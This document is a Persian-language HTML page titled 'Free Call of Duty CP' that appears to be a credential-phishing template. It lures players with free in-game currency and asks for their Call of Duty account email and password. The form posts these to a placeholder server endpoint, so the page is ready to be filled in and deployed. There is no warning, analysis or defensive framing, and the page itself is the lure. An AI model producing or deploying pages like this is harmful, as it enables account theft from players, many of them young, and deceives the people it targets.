<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>دریافت رایگان CP کالاف دیوتی</title>
  <style>
    body {
      background: url('https://wallpapercave.com/wp/wp7373575.jpg') no-repeat center center fixed;
      background-size: cover;
      font-family: 'Vazir', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: rgba(0, 0, 0, 0.7);
      padding: 30px;
      border-radius: 20px;
      text-align: center;
      color: white;
      box-shadow: 0 0 15px #00ffcc;
      width: 90%;
      max-width: 400px;
    }
    h1 {
      margin-bottom: 20px;
      font-size: 28px;
      color: #00ffcc;
    }
    input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 10px;
      font-size: 16px;
    }
    button {
      margin-top: 20px;
      padding: 12px 20px;
      background-color: #00ffcc;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      color: black;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover {
      background-color: #00ccaa;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>سی‌پی رایگان کالاف دیوتی</h1>
    <form action="your-server-endpoint" method="POST">
      <input type="email" name="email" placeholder="ایمیل کالاف دیوتی" required><br>
      <input type="password" name="password" placeholder="رمز عبور اکانت" required><br>
      <button type="submit">دریافت CP</button>
    </form>
  </div>

</body>
</html>
